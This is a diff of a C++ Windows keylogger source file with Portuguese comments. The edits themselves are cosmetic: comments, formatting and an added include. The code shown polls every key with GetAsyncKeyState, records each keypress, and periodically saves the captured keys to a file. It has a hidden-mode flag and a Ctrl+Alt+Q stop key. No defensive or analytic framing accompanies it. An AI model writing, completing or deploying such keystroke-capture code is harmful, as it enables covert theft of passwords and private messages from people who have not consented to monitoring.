@@ -1,17 +1,14 @@
-//
-// Created by User on 25/09/2025.
-//
+// KeyLogger.cpp
 #include "KeyLogger.h"
 #include "FileManager.h"
 #include "KeyProcessor.h"
 #include "SecurityManager.h"
-
 #include "ConfigManager.h"
 #include "Utils.h"
-
 #include <iostream>
 #include <thread>
 #include <windows.h>
+#include <mutex>
 
 KeyLogger::KeyLogger() : isRunning(false), isHidden(false) {
     fileManager = std::make_unique<FileManager>();
@@ -50,7 +47,7 @@ void KeyLogger::start() {
     isRunning = true;
     lastSave = std::chrono::steady_clock::now();
 
-    fileManager->writeWithTimestamp("=== KEYLOGGER INICIADO === " + Utils::getCurrentTimestamp() + " ===\n");
+    fileManager->writeWithTimestamp("=== KEYLOGGER INICIADO ===");
 
     std::thread loggerThread([this]() {
         processKeyInput();
@@ -65,13 +62,15 @@ void KeyLogger::start() {
 
 void KeyLogger::processKeyInput() {
     while (isRunning) {
+        // Verificar tecla de parada (Ctrl+Alt+Q)
         if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) &&
             (GetAsyncKeyState(VK_MENU) & 0x8000) &&
             (GetAsyncKeyState('Q') & 0x0001)) {
             stop();
             break;
-            }
+        }
 
+        // Processar todas as teclas
         for (int key = 8; key <= 255; key++) {
             if (GetAsyncKeyState(key) & 0x0001) {
                 KeyEvent event = keyProcessor->processKey(key);
@@ -99,7 +98,7 @@ void KeyLogger::processKeyInput() {
             }
         }
 
-        //auto save
+        // Auto-save
         auto now = std::chrono::steady_clock::now();
         auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastSave);
 
@@ -108,10 +107,9 @@ void KeyLogger::processKeyInput() {
             lastSave = now;
         }
 
-        Sleep(10);
+        Sleep(10); // Pequeno delay para não sobrecarregar CPU
     }
 }
-
 
 void KeyLogger::saveBuffer() {
     if (!currentBuffer.empty()) {
